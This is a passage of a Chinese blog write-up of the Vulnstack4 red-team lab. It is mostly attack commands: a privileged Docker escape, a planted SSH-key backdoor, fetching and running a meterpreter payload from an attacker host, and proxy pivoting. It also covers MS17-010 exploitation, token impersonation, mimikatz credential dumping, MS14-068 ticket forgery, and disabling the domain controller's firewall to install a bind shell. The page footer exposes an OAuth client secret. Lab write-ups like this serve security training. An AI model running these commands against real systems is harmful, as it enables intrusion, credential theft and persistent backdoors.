+<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+</blockquote>
+<p>查看<code>ls /dev</code>看到&#x2F;dev目录会发现很多设备文件</p>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/e99c0b34daafee7ec78f86a6556edbce.png" alt="截图"></p>
+<p>首先我们现在docker中新建一个&#x2F;hack目录用来挂载文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /zain</span><br><span class="line">mount /dev/sda1 /zain</span><br></pre></td></tr></table></figure>
+
+<p><code>ls /zain</code>成功挂载，此时我们就可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的</p>
+<h4 id="写入密钥"><a href="#写入密钥" class="headerlink" title="写入密钥"></a>写入密钥</h4><p>本地在当前目录生成ssh密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f backdoor</span><br></pre></td></tr></table></figure>
+
+<p>前面说了，将sda1挂载成功，我们就可以通过访问容器内部的&#x2F;zain路径来达到访问整个宿主机的目的，比如我们访问&#x2F;zain&#x2F;home目录也就是访问宿主机的&#x2F;home目录，接下来将密钥写入目标机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /zain/home/ubuntu</span><br><span class="line">ls -alh</span><br></pre></td></tr></table></figure>
+
+<p>我们看见了一个.ssh目录，我们也就是要将ssh秘钥写入到.ssh目录里面并将文件命名为authorized_keys（目标机.ssh目录权限必须为700）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /zain/home/ubuntu/.ssh/id_rsa.pub /zain/home/ubuntu/.ssh/authorized_keys # -avx是将权限也一起复制</span><br><span class="line">echo &gt; /zain/home/ubuntu/.ssh/authorized_keys # 清空authorized_keys文件</span><br><span class="line">echo &#x27;生成的.pub文件的内容&#x27; &gt; /zain/home/ubuntu/.ssh/authorized_keys # 将ssh秘钥写入authorized_keys文件</span><br></pre></td></tr></table></figure>
+
+<p>查看密钥是否写入成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /zain/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>此时，就可以利用自己的私钥进行免密登陆目标宿主机了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i backdoor ubuntu@192.168.2.186</span><br></pre></td></tr></table></figure>
+
+<p><strong>此时边界机器已经被拿下</strong></p>
+<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>发现存在内网网段</p>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/715aa6cccca58dc7a364706be8fa2d60.png" alt="截图"></p>
+<p>再次下载之前生成的木马，反弹一个meterpreter回来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.108:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">nohup ./shell.elf &amp;</span><br></pre></td></tr></table></figure>
+
+<p>获取shell后信息收集：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route # 查看路由信息</span><br><span class="line">arp # 查看arp缓存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/5105fb2b993a855c8bcef67a84b0c689.png" alt="截图"></p>
+<h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 全局加路由</span><br><span class="line">route add 192.168.183.0 255.255.255.0</span><br><span class="line"># meterpreter shell加路由</span><br><span class="line">run autoroute -s 192.168.183.0/24</span><br><span class="line"># 查看路由信息</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line"># 此时仅msf可以进内网</span><br></pre></td></tr></table></figure>
+
+<p>在实际的内网渗透中，我们可以直接添加到 0.0.0.0&#x2F;0 的路由。这样，只要该被控主机可达的地址就都可达</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -sT -Pn 192.168.183.129</span><br><span class="line">db_nmap -sT -Pn 192.168.183.130</span><br><span class="line">services</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建代理"><a href="#创建代理" class="headerlink" title="创建代理"></a>创建代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"># srvhost 默认0.0.0.0就是监听本机了</span><br><span class="line"># 端口一般默认1080</span><br></pre></td></tr></table></figure>
+
+<p>此时通过本机的1080就可以走msf建立的通道访问到内网的服务了</p>
+<p>编辑本地代理服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line"># 修改为msf代理监听的端口</span><br></pre></td></tr></table></figure>
+
+<p>扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.183.129</span><br><span class="line"># -sT tcp扫描</span><br><span class="line"># -Pn 跳过主机发现</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/2f9b538decf6548915c45b9f29e57c5e.png" alt="截图"></p>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/d5e663662f7726d1cf86b1ee89668cf9.png" alt="截图"></p>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/06963f89d3658ac452935f975d35d704.png" alt="截图"></p>
+<h3 id="扫描永恒之蓝漏洞"><a href="#扫描永恒之蓝漏洞" class="headerlink" title="扫描永恒之蓝漏洞"></a>扫描永恒之蓝漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">check 192.168.183.129-130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/14b4571e9f03498a5bfe3a089dab5947.png" alt="截图"></p>
+<p>此时需要建立代理来打：</p>
+<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>ew容易出现超时不操作就会自动断开的问题，这里推荐一款工具chisel</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">chisel下载地址</a></p>
+<p>在目标web服务器上传chisel_for_linux64，然后执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel_for_linux64 server -p 2333 --socks5</span><br></pre></td></tr></table></figure>
+
+<p>攻击机执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel_for_linux64 client 192.168.2.186:2333 sock</span><br></pre></td></tr></table></figure>
+
+<p>选择ms17-010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:[ip]:[端口]设置代理</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp //正向连接</span><br><span class="line">set port 4444</span><br><span class="line">set rhost 192.168.183.136</span><br><span class="line">set AutoRunScript post/windows/manage/migrate //自动迁移进程</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2-推荐"><a href="#方法2-推荐" class="headerlink" title="方法2(推荐)"></a>方法2(推荐)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole //新建一个代理中的msfconsole（因为是在公网的vps上开的代理，所以可以在内网机器中开）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/f23fe8bc79c7b7917cbb04f8bf27a231.png" alt="截图"></p>
+<p>成功，而且很稳定</p>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/3174788fb0670c44a30563a1db32fc7a.png" alt="截图"></p>
+<p>但是没法获取交互式shell，只能在meterpreter shell中操作，如果想获取交互式shell，则需要创建后门，然后通过代理正向连接后门：</p>
+<blockquote>
+<p>meterpreter&gt; run persistence -i 10 -X -p 4000 -P windows&#x2F;meterpreter&#x2F;bind_tcp</p>
+<br>
+
+<p>msf&gt; use exploit&#x2F;multi&#x2F;handle</p>
+<p>msf&gt; set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
+<p>msf&gt; set rhost 192.168.183.145</p>
+<p>msf&gt; set lport 4000</p>
+<p>msf&gt; setg proxies socks5:127.0.0.1:1080</p>
+<p>msf&gt; run</p>
+</blockquote>
+<h3 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h3><p>因为在域中，不是域用户没有权限执行域命令，所以需要降权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getuid #查看当前token</span><br><span class="line">use incognito #加载incognito</span><br><span class="line">list_tokens -u #列出AccessToken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot; #模拟DEMO\douser用户</span><br><span class="line">rev2self #返回到之前的AccessToken权限（降到DEMO\douser）</span><br></pre></td></tr></table></figure>
+
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 查看本机ip，所在域 </span><br><span class="line">route print 打印路由信息 </span><br><span class="line">net view 查看局域网内其他主机名 </span><br><span class="line">arp -a 查看arp缓存 </span><br><span class="line">whoami </span><br><span class="line">net start 查看开启了哪些服务 </span><br><span class="line">net share 查看开启了哪些共享 </span><br><span class="line">net share ipc$ 开启ipc共享 </span><br><span class="line">net share c$ 开启c盘共享 </span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot; 与192.168.xx.xx建立空连接 </span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot; 建立c盘共享 </span><br><span class="line">dir \\192.168.xx.xx\c$\user 查看192.168.xx.xx c盘user目录下的文件 </span><br><span class="line">net config Workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 </span><br><span class="line">net user 查看本机用户列表 </span><br><span class="line">net user /domain 查看域用户 </span><br><span class="line">net localgroup administrators 查看本地管理员组（通常会有域用户） </span><br><span class="line">net view /domain 查看有几个域 </span><br><span class="line">net user 用户名 /domain 获取指定域用户的信息 </span><br><span class="line">net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） </span><br><span class="line">net group 组名 /domain 查看域中某工作组 </span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员的名字 </span><br><span class="line">net group &quot;domain computers&quot; /domain 查看域中的其他主机名 </span><br><span class="line">net group &quot;doamin controllers&quot; /domain 查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用ms14-067攻击域控"><a href="#利用ms14-067攻击域控" class="headerlink" title="利用ms14-067攻击域控"></a>利用ms14-067攻击域控</h3><h4 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; upload mimikatz.exe #上传mimikatz</span><br><span class="line">meterpreter&gt; getsystem #提权至system</span><br><span class="line">meterpreter&gt; shell #获取系统交互shell</span><br><span class="line">&gt;mimikatz.exe #运行mimikatz</span><br><span class="line">mimikatz # privilege::debug #启用调试模式</span><br><span class="line">mimikatz # sekurlsa::logonpasswords #抓取密码和账户信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用ms14-068生成票据"><a href="#利用ms14-068生成票据" class="headerlink" title="利用ms14-068生成票据"></a>利用ms14-068生成票据</h4><blockquote>
+<p>ms14-068.exe -u 域成员名-s 域成员sid -d 域控制器ip地址 -p 域成员密码</p>
+<p>mimikatz注入票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc &lt;生成的票据文件&gt; //将票据注入到内存中</span><br><span class="line"></span><br><span class="line">利用/验证</span><br><span class="line">&gt; net use \\win-ens2vr5tr3n(域控机器名)</span><br><span class="line">&gt; dir \\win-ens2vr5tr3n\c$ (列出c盘)</span><br><span class="line">&gt; copy c:\windows\system32\bind.exe \\WIN-ENS2VR5TR3N\c$ (上传木马)</span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br><span class="line"></span><br><span class="line">创建msf马</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N start bindshell</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/a8e3a6217a132d777b4bde180d3d4ad4.png" alt="截图"></p>
+<h4 id="上传mimikatz抓取密码"><a href="#上传mimikatz抓取密码" class="headerlink" title="上传mimikatz抓取密码"></a>上传mimikatz抓取密码</h4><br>
+
+<h2 id="完"><a href="#完" class="headerlink" title="完"></a>完</h2>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag"># 内网安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/nmap%E6%B5%8B%E8%AF%95%E5%A4%A7%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E4%B8%AD%E5%AD%98%E6%B4%BB%E7%9A%84%E4%B8%BB%E6%9C%BA/" rel="prev" title="nmap测试大网络空间中存活的主机">
+                  <i class="fa fa-chevron-left"></i> nmap测试大网络空间中存活的主机
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/metasploit%E5%B0%8F%E7%BB%93/" rel="next" title="metasploit小结">
+                  metasploit小结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zain</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"ByZain","repo":"ByZain.github.io","client_id":"042f68014b224a5b5da6","client_secret":"20ef48532c59524b2b8e5a1922772f6d6b796ad6","admin_user":"ByZain","distraction_free_mode":false,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token/","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"944210d923f276a5e23cc2565f3b4f4c"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<script src="/js/clickboom.js"></script>
+</body>
+</html>
